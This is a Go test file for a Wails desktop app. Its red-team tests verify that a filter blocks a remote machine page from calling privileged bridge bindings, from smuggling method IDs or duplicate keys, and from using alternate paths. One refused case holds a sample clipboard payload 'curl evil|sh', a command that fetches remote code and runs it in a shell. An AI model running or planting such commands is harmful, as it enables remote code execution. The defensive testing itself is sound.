package main

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"reflect"
	"strings"
	"testing"
)

type reached struct {
	n    int
	body string
}

func filterUnderTest() (http.Handler, *reached) {
	got := &reached{}
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got.n++
		b, _ := io.ReadAll(r.Body)
		got.body = string(b)
		_, _ = io.WriteString(w, "ok")
	})
	return filterMachinePageWails(next), got
}

func callBody(name string) string {
	return `{"object":0,"method":0,"args":{"call-id":"c1","methodName":"` + name + `","args":[]}}`
}

func post(h http.Handler, path, body string, hdr map[string]string) int {
	r := httptest.NewRequest("POST", path, strings.NewReader(body))
	for k, v := range hdr {
		r.Header.Set(k, v)
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, r)
	return rec.Code
}

// Every exported binding of the desktop service is refused on another Mac's
// page except the machine switcher's; the allow list names real bindings.
func TestRedTeam_Desktop_MachinePageCanOnlyCallTheSwitcherBindings(t *testing.T) {
	h, got := filterUnderTest()
	svc := reflect.TypeOf(&DesktopService{})
	allowedSeen := map[string]bool{}
	for i := 0; i < svc.NumMethod(); i++ {
		name := "main.DesktopService." + svc.Method(i).Name
		code := post(h, "/wails/runtime", callBody(name), nil)
		if machinePageBindings[name] {
			allowedSeen[name] = true
			if code != 200 {
				t.Errorf("%s refused (%d)", name, code)
			}
		} else if code != http.StatusForbidden {
			t.Errorf("%s: %d, want 403", name, code)
		}
	}
	for name := range machinePageBindings {
		if !allowedSeen[name] {
			t.Errorf("allowed binding %s does not exist on DesktopService", name)
		}
	}
	for _, must := range []string{"SelectFolder", "RevealFolder", "SetMenuShortcuts", "InstallUpdate", "OpenExternal", "Notify", "CheckForUpdates", "OpenAppManagementSettings", "NotchOpenSession"} {
		if _, ok := svc.MethodByName(must); !ok {
			t.Errorf("DesktopService.%s no longer exists: update this test", must)
		}
		if post(h, "/wails/runtime", callBody("main.DesktopService."+must), nil) != http.StatusForbidden {
			t.Errorf("%s reachable from a machine page", must)
		}
	}
	if got.n != len(machinePageBindings) {
		t.Fatalf("%d requests reached Wails, want %d", got.n, len(machinePageBindings))
	}
}

func TestRedTeam_Desktop_MachinePageCannotReachOtherWailsObjectsOrSmuggleCalls(t *testing.T) {
	h, got := filterUnderTest()
	refused := map[string]string{
		"clipboard SetText":  `{"object":1,"method":0,"args":{"text":"curl evil|sh"}}`,
		"clipboard Text":     `{"object":1,"method":1,"args":{}}`,
		"application Quit":   `{"object":2,"method":0,"args":{}}`,
		"events Emit":        `{"object":3,"method":0,"args":{"name":"eggify:shortcut","data":"x"}}`,
		"dialog":             `{"object":5,"method":0,"args":{}}`,
		"window":             `{"object":6,"method":0,"args":{}}`,
		"system":             `{"object":8,"method":0,"args":{}}`,
		"browser OpenURL":    `{"object":9,"method":0,"args":{"url":"https://evil.example"}}`,
		"call by id":         `{"object":0,"method":0,"args":{"call-id":"c","methodID":1234,"args":[]}}`,
		"id next to allowed": `{"object":0,"method":0,"args":{"call-id":"c","methodName":"main.DesktopService.SelectFolder","methodID":1,"args":[]}}`,
		"wrong call method":  `{"object":0,"method":1,"args":{"call-id":"c","methodName":"main.DesktopService.Machines"}}`,
		"missing call id":    `{"object":0,"method":0,"args":{"methodName":"main.DesktopService.Machines"}}`,
		"missing object":     `{"method":0,"args":{"call-id":"c","methodName":"main.DesktopService.Machines"}}`,
		"empty":              ``,
		"not json":           `object=0&method=0`,
	}
	for name, body := range refused {
		if code := post(h, "/wails/runtime", body, nil); code != http.StatusForbidden {
			t.Errorf("%s: %d, want 403", name, code)
		}
	}
	// Chunked bodies, query-string calls, other verbs, other paths.
	if post(h, "/wails/runtime", callBody("main.DesktopService.Machines"), map[string]string{"x-wails-chunk-id": "1"}) != http.StatusForbidden {
		t.Error("chunked call passed")
	}
	if post(h, "/wails/runtime?object=9&method=0", callBody("main.DesktopService.Machines"), nil) != http.StatusForbidden {
		t.Error("query-string call passed")
	}
	if post(h, "/wails/other", callBody("main.DesktopService.Machines"), nil) != http.StatusForbidden {
		t.Error("POST to another /wails path passed")
	}
	r := httptest.NewRequest("GET", "/wails/runtime?object=9&method=0&args=%7B%22url%22%3A%22https%3A%2F%2Fevil%22%7D", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, r)
	if rec.Code != http.StatusForbidden {
		t.Errorf("GET /wails/runtime: %d", rec.Code)
	}
	if got.n != 0 {
		t.Fatalf("%d refused requests reached Wails", got.n)
	}
	// The runtime script itself is a plain read.
	rec = httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest("GET", "/wails/runtime.js", nil))
	if rec.Code != 200 || got.n != 1 {
		t.Errorf("runtime.js: %d (reached %d)", rec.Code, got.n)
	}
}

// Wails reads the canonical body the filter built: a methodID or extra keys in
// the page's body never get through.
func TestMachinePageCall_ForwardedBodyIsCanonical(t *testing.T) {
	h, got := filterUnderTest()
	body := `{"object":0,"method":0,"extra":1,"args":{"call-id":"c9","methodName":"main.DesktopService.SwitchMachine","methodID":7,"junk":true,"args":["studio"]}}`
	if post(h, "/wails/runtime", body, nil) != 200 {
		t.Fatal("allowed call refused")
	}
	var fwd map[string]any
	if err := json.Unmarshal([]byte(got.body), &fwd); err != nil {
		t.Fatal(err)
	}
	args := fwd["args"].(map[string]any)
	if _, has := args["methodID"]; has || args["junk"] != nil || fwd["extra"] != nil {
		t.Fatalf("forwarded body kept page-controlled extras: %s", got.body)
	}
	if args["methodName"] != "main.DesktopService.SwitchMachine" || args["call-id"] != "c9" || len(args["args"].([]any)) != 1 {
		t.Fatalf("forwarded body: %s", got.body)
	}
	// Duplicate and case-folded keys: Go's parser takes the last one, and what
	// Wails receives is the filter's reading, never the page's bytes, so the
	// call that is checked is the call that runs (here: Machines, not SelectFolder).
	dup := `{"object":1,"Object":0,"method":0,"args":{"call-id":"c","methodName":"main.DesktopService.SelectFolder","MethodName":"main.DesktopService.Machines"}}`
	if post(h, "/wails/runtime", dup, nil) != 200 || !strings.Contains(got.body, `"methodName":"main.DesktopService.Machines"`) || strings.Contains(got.body, "SelectFolder") {
		t.Errorf("duplicate keys: forwarded %s", got.body)
	}
	// Cancelling a call is allowed.
	if post(h, "/wails/runtime", `{"object":10,"method":0,"args":{"call-id":"c9"}}`, nil) != 200 {
		t.Error("cancel refused")
	}
}

// This Mac's own window (127.0.0.1) keeps its full bridge; only the machine
// proxy's handler is filtered.
func TestBridgeFilterOnlyOnTheMachineProxyHandler(t *testing.T) {
	b := &bridge{transport: newBridgeTransport()}
	rec := httptest.NewRecorder()
	r := httptest.NewRequest("POST", "/wails/runtime", strings.NewReader(`{"object":9,"method":0,"args":{"url":"https://x"}}`))
	b.proxiedWailsHandler().ServeHTTP(rec, r)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("proxied handler: %d", rec.Code)
	}
	rec = httptest.NewRecorder()
	b.serveWails(rec, httptest.NewRequest("POST", "/wails/runtime", strings.NewReader(`{}`)))
	if rec.Code != http.StatusServiceUnavailable { // not filtered: reaches the (not ready) runtime
		t.Fatalf("local handler: %d", rec.Code)
	}
}
